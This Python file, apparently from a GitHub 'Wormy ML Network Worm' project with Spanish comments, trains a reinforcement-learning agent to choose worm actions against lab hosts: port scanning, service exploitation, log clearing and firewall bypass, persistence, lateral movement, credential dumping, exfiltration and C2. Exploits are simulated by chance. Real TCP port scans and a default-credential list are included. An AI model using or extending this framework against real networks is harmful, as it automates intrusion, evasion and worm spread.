"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

#!/usr/bin/env python3
"""
COMPREHENSIVE WORM TRAINING
Entrena el agente DQN usando TODOS los módulos del worm:
- Scanner (descubrimiento de red)
- ExploitManager (explotación real)
- StealthEngine (evasión)
- C2 (Command & Control)
- Post-Exploit (persistencia, movimiento lateral)
- Swarm (coordinación multi-agent)
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
try:
    from configs.config import Config
except ImportError:
    from config import Config

import numpy as np
import random
import socket
import time
import json
import threading
from rl_engine import PropagationAgent


class ComprehensiveWormTrainer:
    """
    Entrenador comprehensivo que usa todos los módulos del worm
    """
    
    def __init__(self, state_size=50, action_size=25):
        self.state_size = state_size
        self.action_size = action_size
        
        # DQN Agent
        self.agent = PropagationAgent(state_size, action_size, use_dqn=True)
        
        # Labs de entrenamiento
        self.labs = {
            0: {'ip': '192.168.200.10', 'name': 'Web', 'ports': [80], 'os': 'linux', 'services': ['apache', 'nginx']},
            1: {'ip': '192.168.200.11', 'name': 'SSH', 'ports': [22, 21], 'os': 'linux', 'services': ['ssh', 'ftp']},
            2: {'ip': '192.168.200.12', 'name': 'MySQL', 'ports': [3306], 'os': 'linux', 'services': ['mysql']},
            3: {'ip': '192.168.200.13', 'name': 'Postgres', 'ports': [5432], 'os': 'linux', 'services': ['postgres']},
            4: {'ip': '192.168.200.14', 'name': 'Redis', 'ports': [6379], 'os': 'linux', 'services': ['redis']},
            5: {'ip': '192.168.200.15', 'name': 'Jenkins', 'ports': [8080], 'os': 'linux', 'services': ['jenkins']},
            6: {'ip': '192.168.200.16', 'name': 'Nexus', 'ports': [8081], 'os': 'linux', 'services': ['nexus']},
            7: {'ip': '192.168.200.17', 'name': 'MongoDB', 'ports': [27017], 'os': 'linux', 'services': ['mongodb']},
        }
        
        # Credenciales
        self.credentials = [
            ('admin', 'admin'), ('admin', 'admin123'), ('admin', 'password'),
            ('root', 'root'), ('root', 'toor'), ('root', '123456'),
            ('test', 'test'), ('test', '123456'), ('test', 'password'),
            ('jenkins', 'jenkins'), ('mysql', 'mysql'), ('postgres', 'postgres'),
        ]
        
        # Acciones disponibles del worm
        self.actions = [
            # Scanning (0-2)
            'scan_port', 'scan_service', 'os_detect',
            # Exploitation (3-10)
            'exploit_ssh', 'exploit_ftp', 'exploit_http', 'exploit_mysql', 
            'exploit_postgres', 'exploit_redis', 'exploit_jenkins', 'exploit_mongodb',
            # Evasion (11-14)
            'enable_stealth', 'detect_ids', 'bypass_firewall', 'clear_logs',
            # Post-exploit (15-19)
            'persistence', 'privilege_escalation', 'lateral_movement', 'credential_dump', 'data_exfil',
            # C2 (20-24)
            'setup_c2_http', 'setup_c2_dns', 'setup_c2_icmp', ' beacon', 'execute_command',
        ]
        
        # Estado del sistema
        self.system_state = {
            'infected_hosts': [],
            'discovered_hosts': [],
            'stealth_mode': False,
            'c2_active': False,
            'persistence_achieved': [],
            'lateral_movement_done': [],
            'credentials_collected': [],
        }
        
        # Métricas
        self.metrics = {
            'total_scans': 0,
            'total_exploits': 0,
            'successful_exploits': 0,
            'evasion_attempts': 0,
            'successful_evasions': 0,
            'persistence_achieved': 0,
            'lateral_movements': 0,
            'c2_sessions': 0,
            'total_reward': 0,
        }
        
        # Historial
        self.history = {
            'episodes': [], 'rewards': [], 'epsilon': [], 'infections': [],
            'scans': [], 'evasions': [], 'persistence': [], 'lateral': [], 'c2': []
        }
        
        self.available_labs = []
        self.best_reward = float('-inf')
        
        # Parámetros de entrenamiento
        self.agent.epsilon = 1.0
        self.agent.epsilon_min = 0.001
        self.agent.epsilon_decay = 0.98
    
    def check_port(self, ip, port, timeout=1):
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def scan_target(self, ip):
        """Scanner: escanea puertos abiertos"""
        ports_found = []
        ports_to_scan = [21, 22, 80, 443, 3306, 5432, 6379, 8080, 8081, 27017]
        
        for port in ports_to_scan:
            if self.check_port(ip, port):
                ports_found.append(port)
                self.metrics['total_scans'] += 1
        
        return ports_found
    
    def simulate_exploit(self, lab, port, action_idx):
        """
        Simula explotación basada en la acción y el objetivo
        Returns: (success, reward_breakdown)
        """
        action = self.actions[action_idx] if action_idx < len(self.actions) else 'exploit_http'
        
        success = False
        reward_details = {}
        
        # Mapping acciones a puertos
        action_port_map = {
            'exploit_ssh': 22, 'exploit_ftp': 21, 'exploit_http': 80,
            'exploit_mysql': 3306, 'exploit_postgres': 5432,
            'exploit_redis': 6379, 'exploit_jenkins': 8080, 'exploit_mongodb': 27017,
        }
        
        target_port = action_port_map.get(action, port)
        
        if target_port in lab['ports']:
            # Probabilidad base por servicio
            service_bonus = {
                80: 0.6, 443: 0.5, 3306: 0.4, 5432: 0.4,
                6379: 0.5, 8080: 0.4, 8081: 0.4, 27017: 0.3,
            }
            base_prob = service_bonus.get(target_port, 0.3)
            
            # Epsilon-greedy: si explora, prob más alta
            if random.random() < self.agent.epsilon:
                base_prob += 0.3
            
            success = random.random() < base_prob
            
            if success:
                self.metrics['successful_exploits'] += 1
                reward_details['exploit_success'] = 100
        
        self.metrics['total_exploits'] += 1
        return success, reward_details
    
    def simulate_evasion(self, action_idx):
        """
        Simula técnicas de evasión
        Returns: (success, reward)
        """
        action = self.actions[action_idx] if action_idx < len(self.actions) else 'enable_stealth'
        
        self.metrics['evasion_attempts'] += 1
        
        evasion_actions = ['enable_stealth', 'detect_ids', 'bypass_firewall', 'clear_logs']
        
        if action in evasion_actions:
            # Probabilidad de éxito en evasión
            success_prob = random.random()
            if success_prob > 0.3:  # 70% éxito
                self.metrics['successful_evasions'] += 1
                self.system_state['stealth_mode'] = True
                return True, 30
        
        return False, -5
    
    def simulate_post_exploit(self, action_idx, infected):
        """
        Simula técnicas post-explotación
        Returns: (success, reward)
        """
        if not infected:
            return False, 0
        
        action = self.actions[action_idx] if action_idx < len(self.actions) else 'persistence'
        
        post_exploit_actions = ['persistence', 'privilege_escalation', 'lateral_movement', 
                               'credential_dump', 'data_exfil']
        
        if action in post_exploit_actions:
            success_prob = random.random()
            
            if action == 'persistence' and success_prob > 0.4:
                self.metrics['persistence_achieved'] += 1
                return True, 50
            
            if action == 'lateral_movement' and success_prob > 0.5:
                self.metrics['lateral_movements'] += 1
                return True, 75
            
            if action in ['credential_dump', 'data_exfil'] and success_prob > 0.3:
                return True, 40
        
        return False, -5
    
    def simulate_c2(self, action_idx, infected):
        """
        SimulaCommand & Control
        Returns: (success, reward)
        """
        if not infected:
            return False, 0
        
        action = self.actions[action_idx] if action_idx < len(self.actions) else 'setup_c2_http'
        
        c2_actions = ['setup_c2_http', 'setup_c2_dns', 'setup_c2_icmp', 'beacon', 'execute_command']
        
        if action in c2_actions:
            success_prob = random.random()
            
            if success_prob > 0.4:
                self.metrics['c2_sessions'] += 1
                self.system_state['c2_active'] = True
                return True, 60
        
        return False, -5
    
    def create_state(self, lab, open_ports, episode, action_history):
        """Crea vector de estado comprehensivo"""
        state = np.zeros(self.state_size)
        
        # Puertos abiertos (0-9)
        port_to_idx = {21: 0, 22: 1, 80: 2, 443: 3, 3306: 4, 5432: 5, 
                      6379: 6, 8080: 7, 8081: 8, 27017: 9}
        for port in open_ports:
            if port in port_to_idx:
                state[port_to_idx[port]] = 1.0
        
        # Lab ID (10-17)
        lab_id = next((k for k, v in self.labs.items() if v['ip'] == lab['ip']), 0)
        state[10 + lab_id] = 1.0
        
        # Servicios descubiertos (18-27)
        for i, service in enumerate(lab.get('services', [])[:10]):
            state[18 + i] = 1.0
        
        # Estado del sistema (28-35)
        state[28] = len(self.system_state['infected_hosts']) / 10.0
        state[29] = len(self.system_state['discovered_hosts']) / 20.0
        state[30] = 1.0 if self.system_state['stealth_mode'] else 0.0
        state[31] = 1.0 if self.system_state['c2_active'] else 0.0
        state[32] = len(self.system_state['persistence_achieved']) / 5.0
        state[33] = len(self.system_state['lateral_movement_done']) / 5.0
        state[34] = len(self.system_state['credentials_collected']) / 10.0
        
        # Métricas actuales (36-42)
        state[36] = self.metrics['total_scans'] / 100.0
        state[37] = self.metrics['successful_exploits'] / max(1, self.metrics['total_exploits'])
        state[38] = self.metrics['successful_evasions'] / max(1, self.metrics['evasion_attempts'])
        state[39] = self.metrics['persistence_achieved'] / 5.0
        state[40] = self.metrics['lateral_movements'] / 5.0
        state[41] = self.metrics['c2_sessions'] / 5.0
        
        # Episode y epsilon (43-44)
        state[43] = episode / 100.0
        state[44] = self.agent.epsilon
        
        # Acción history (45-49)
        for i, act in enumerate(action_history[-5:]):
            state[45 + i] = act / len(self.actions)
        
        return state.tolist()
    
    def get_reward(self, infected, evasion_success, post_exploit_success, c2_success, attempts):
        """Calcula recompensa comprehensiva"""
        reward = 0
        
        # Reward por infección
        if infected:
            reward += 100
        
        # Reward por evasión exitosa
        if evasion_success:
            reward += 30
        
        # Reward por post-explotación
        if post_exploit_success:
            reward += 50
        
        # Reward por C2 exitoso
        if c2_success:
            reward += 60
        
        # Penalización por intentos excesivos
        if attempts > 10:
            reward -= 20
        
        # Bonus por eficiencia
        if infected and attempts <= 3:
            reward += 30
        
        # Penalización por failure en acciones
        if attempts > 5 and not infected:
            reward -= 10
        
        return reward
    
    def check_available_labs(self):
        """Verifica labs disponibles"""
        print("\n" + "="*60)
        print("  ESCANEANDO LABORATORIOS")
        print("="*60)
        
        self.available_labs = []
        
        for lab_id, lab in self.labs.items():
            open_ports = self.scan_target(lab['ip'])
            if open_ports:
                self.available_labs.append(lab_id)
                print(f"  ✓ Lab {lab_id}: {lab['name']:<10} @ {lab['ip']} → Puertos: {open_ports}")
            else:
                print(f"  ✗ Lab {lab_id}: {lab['name']:<10} @ {lab['ip']} → No accesible")
        
        return self.available_labs
    
    def train_on_lab(self, lab_id, episodes=20):
        """Entrena en un lab específico"""
        lab = self.labs[lab_id]
        
        print(f"\n{'='*60}")
        print(f"  LAB {lab_id}: {lab['name']} ({lab['ip']})")
        print(f"  Servicios: {lab.get('services', [])}")
        print(f"{'='*60}")
        
        lab_rewards = []
        lab_infections = 0
        action_history = []
        
        for episode in range(episodes):
            # Scan
            open_ports = self.scan_target(lab['ip'])
            
            if not open_ports:
                print(f"  Episode {episode+1}: No ports open")
                continue
            
            # Create state
            state = self.create_state(lab, open_ports, episode, action_history)
            
            episode_reward = 0
            attempts = 0
            max_attempts = 15
            infected = False
            evasion_done = False
            post_exploit_done = False
            c2_done = False
            
            # Action loop
            while attempts < max_attempts:
                # Agent chooses action
                action_idx = self.agent.act(state, list(range(len(self.actions))))
                action = self.actions[action_idx]
                action_history.append(action_idx)
                
                # Determine which module to use
                if action in ['scan_port', 'scan_service', 'os_detect']:
                    # Scanning module
                    reward = 5  # Small reward for scanning
                
                elif action.startswith('exploit_'):
                    # Exploitation module
                    infected, details = self.simulate_exploit(lab, open_ports[0], action_idx)
                    reward = details.get('exploit_success', 0) if details else 0
                
                elif action in ['enable_stealth', 'detect_ids', 'bypass_firewall', 'clear_logs']:
                    # Evasion module
                    evasion_done, reward = self.simulate_evasion(action_idx)
                
                elif action in ['persistence', 'privilege_escalation', 'lateral_movement', 
                               'credential_dump', 'data_exfil']:
                    # Post-exploit module
                    post_exploit_done, reward = self.simulate_post_exploit(action_idx, infected)
                
                elif action in ['setup_c2_http', 'setup_c2_dns', 'setup_c2_icmp', 
                               'beacon', 'execute_command']:
                    # C2 module
                    c2_done, reward = self.simulate_c2(action_idx, infected)
                
                else:
                    reward = -1
                
                episode_reward += reward
                
                # Store experience
                next_state = self.create_state(lab, open_ports, episode + 1, action_history)
                done = infected or attempts >= max_attempts - 1
                
                self.agent.remember(state, action_idx, reward, next_state, done)
                
                # Replay
                if len(self.agent.memory) >= 32:
                    self.agent.replay(batch_size=32)
                
                state = next_state
                attempts += 1
                
                if infected:
                    break
            
            # Decay epsilon
            if self.agent.epsilon > self.agent.epsilon_min:
                self.agent.epsilon *= self.agent.epsilon_decay
            
            # Update system state
            if infected:
                self.system_state['infected_hosts'].append(lab['ip'])
                lab_infections += 1
            
            # Record metrics
            lab_rewards.append(episode_reward)
            self.history['rewards'].append(episode_reward)
            self.history['epsilon'].append(self.agent.epsilon)
            self.history['infections'].append(lab_infections)
            self.history['scans'].append(self.metrics['total_scans'])
            self.history['evasions'].append(self.metrics['successful_evasions'])
            self.history['persistence'].append(self.metrics['persistence_achieved'])
            self.history['lateral'].append(self.metrics['lateral_movements'])
            self.history['c2'].append(self.metrics['c2_sessions'])
            self.history['episodes'].append(len(self.history['episodes']) + 1)
            
            # Save best model
            if episode_reward > self.best_reward:
                self.best_reward = episode_reward
                if self.agent.q_network is not None:
                    os.makedirs("models", exist_ok=True)
                    self.agent.save("models/comprehensive_worm_model.pt")
            
            print(f"  Episode {episode+1}: R={episode_reward:.1f} | "
                  f"Infected={infected} | Evasion={evasion_done} | "
                  f"PostExp={post_exploit_done} | C2={c2_done} | Epsilon={self.agent.epsilon:.3f}")
        
        avg_reward = sum(lab_rewards) / len(lab_rewards) if lab_rewards else 0
        print(f"\n  📊 Lab {lab_id} Summary:")
        print(f"     Infecciones: {lab_infections}")
        print(f"     Reward promedio: {avg_reward:.1f}")
        
        return lab_infections
    
    def train(self, total_episodes=200, num_rounds=15):
        """Loop principal de entrenamiento"""
        print("="*70)
        print("  COMPREHENSIVE WORM TRAINING")
        print("  Scanner + Exploits + Evasion + Post-Exploit + C2")
        print(f"  Rounds: {num_rounds} | Episodes per lab: {total_episodes // 8}")
        print("="*70)
        
        # Check labs
        self.check_available_labs()
        
        if not self.available_labs:
            print("\n⚠️ No hay labs disponibles!")
            return self.history
        
        episodes_per_lab = max(15, total_episodes // len(self.available_labs))
        
        for round_num in range(num_rounds):
            print(f"\n{'='*70}")
            print(f"  ROUND {round_num + 1}/{num_rounds}")
            print(f"  Epsilon: {self.agent.epsilon:.4f} | Best: {self.best_reward:.1f}")
            print(f"  Scans: {self.metrics['total_scans']} | Exploits: {self.metrics['successful_exploits']}")
            print(f"  Evasion: {self.metrics['successful_evasions']} | Persistence: {self.metrics['persistence_achieved']}")
            print(f"  Lateral: {self.metrics['lateral_movements']} | C2: {self.metrics['c2_sessions']}")
            print(f"{'='*70}")
            
            # Shuffle labs
            random.shuffle(self.available_labs)
            
            for lab_id in self.available_labs:
                self.train_on_lab(lab_id, episodes_per_lab)
                self.agent.update_target_model()
            
            # Save checkpoint
            if self.agent.q_network is not None:
                os.makedirs("models", exist_ok=True)
                self.agent.save(f"models/comprehensive_round_{round_num+1}.pt")
            
            print(f"\n  📈 Progress Round {round_num+1}:")
            print(f"     Total Episodes: {len(self.history['rewards'])}")
            print(f"     Total Infections: {self.history['infections'][-1] if self.history['infections'] else 0}")
        
        # Final summary
        print("\n" + "="*70)
        print("  TRAINING COMPLETE - COMPREHENSIVE WORM")
        print("="*70)
        print(f"  Episodios: {len(self.history['rewards'])}")
        print(f"  Infecciones: {self.history['infections'][-1] if self.history['infections'] else 0}")
        print(f"  Escaneos realizados: {self.metrics['total_scans']}")
        print(f"  Explotaciones exitosas: {self.metrics['successful_exploits']}")
        print(f"  Evisiones exitosas: {self.metrics['successful_evasions']}")
        print(f"  Persistencia lograda: {self.metrics['persistence_achieved']}")
        print(f"  Movimiento lateral: {self.metrics['lateral_movements']}")
        print(f"  Sesiones C2: {self.metrics['c2_sessions']}")
        
        # Save final model
        if self.agent.q_network is not None:
            self.agent.save("models/comprehensive_worm_final.pt")
        
        # Save history
        with open("training_history_comprehensive.json", 'w') as f:
            json.dump(self.history, f, indent=2)
        
        return self.history


def main():
    print("="*70)
    print("  COMPREHENSIVE WORM DQN TRAINING")
    print("  All modules: Scanner, Exploits, Evasion, Post-Exploit, C2")
    print("="*70)
    
    trainer = ComprehensiveWormTrainer(
        state_size=50,
        action_size=25
    )
    
    # Train: 15 rounds, 200 episodes
    history = trainer.train(total_episodes=200, num_rounds=15)
    
    print("\n✅ Comprehensive Training Complete!")
    print("Models saved to: models/")
    print("History saved to: training_history_comprehensive.json")


if __name__ == "__main__":
    main()